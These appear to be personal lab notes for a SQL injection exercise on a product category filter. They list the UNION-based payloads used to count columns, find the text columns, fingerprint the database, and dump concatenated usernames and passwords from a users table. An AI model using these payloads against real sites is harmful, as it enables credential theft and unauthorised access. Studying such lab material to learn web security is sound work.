SQL injection - product category filter
Goal - Output usernames and passwords, login as administrator

Analysis:

Determine if injectable, filter?category=Gifts

1. Determine number of columns
filter?category=Gifts' order by 1--
filter?category=Gifts' order by 2--
filter?category=Gifts' order by 3-- -> Results in internal server error, so 2 only

2. Find which columns contain the data type text

2. Determine data type of columns

select a, b from products where category='Gifts'
' UNION select 'a', NULL--
' UNION select 'NULL', 'a'-- -> second is type string

Only one column is a string, and we want to output username and password

Could use two queries
' UNION select NULL, username from users--
' UNION select NULL, password from users--

Let's do one query instead, but first we need to find out what db product we're using so
we know how to concat a string.

' UNION select NULL, @@version-- MS, MySQL
' UNION select NULL, version()-- PostgreSQL

' UNION select NULL, username || password from users--
-> brings the two columns together

' UNION select NULL, username || ',' || password from users--
